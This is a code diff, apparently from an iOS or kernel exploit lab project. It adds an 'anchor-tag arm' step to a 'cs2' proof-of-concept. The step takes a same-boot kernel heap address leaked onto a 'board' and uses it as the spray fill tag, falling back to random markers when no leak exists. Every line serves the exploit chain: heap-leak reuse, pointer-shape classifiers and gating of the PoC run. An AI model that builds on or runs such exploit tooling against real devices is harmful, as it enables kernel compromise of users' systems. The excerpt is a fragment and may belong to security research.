@@ -2,6 +2,7 @@
 #import "LabRuntimeOffsets.h"
 #import "LabDeviceProfile.h"
 #import "../P007Board.h"
+#import "../LabHeapAnchor.h"
 
 // cs2 core (verbatim upstream, prefixed)
 #include "cs2/poc.h"   // cs2_run, cs2_pe*, cs2_context_t/cs2_ctx
@@ -240,6 +241,23 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
             if (g_cs2_log_fd >= 0) { close(g_cs2_log_fd); g_cs2_log_fd = -1; }
             g_cs2_running = NO;
             return @"cs2 SKIP (patched train, unlicensed) — run cscali 1-2x here, or lswarm override.";
+        }
+    }
+
+    /* anchor-tag arm (2026-11-19): REAL same-boot heap leak from the board
+       leaks[] becomes the fil-tag fill. Zero = honest random-marker
+       fallback. Excluded from every kptr-shape classifier in the core. */
+    {
+        uint64_t anchor = LabHeapAnchorSameBoot();
+        if (anchor) {
+            cs2_ctx.heap_anchor = anchor;
+            cs2_ctx.heap_anchor_armed = 1;
+            cs2_log("[anchor] fil tag ARMED with same-boot heap leak 0x%llx (board leaks[]; own-page class only)",
+                    (unsigned long long)anchor);
+        } else {
+            cs2_ctx.heap_anchor = 0;
+            cs2_ctx.heap_anchor_armed = 0;
+            cs2_log("[anchor] no same-boot heap leak in board leaks[] — fil tag stays random-marker (honest)");
         }
     }
 
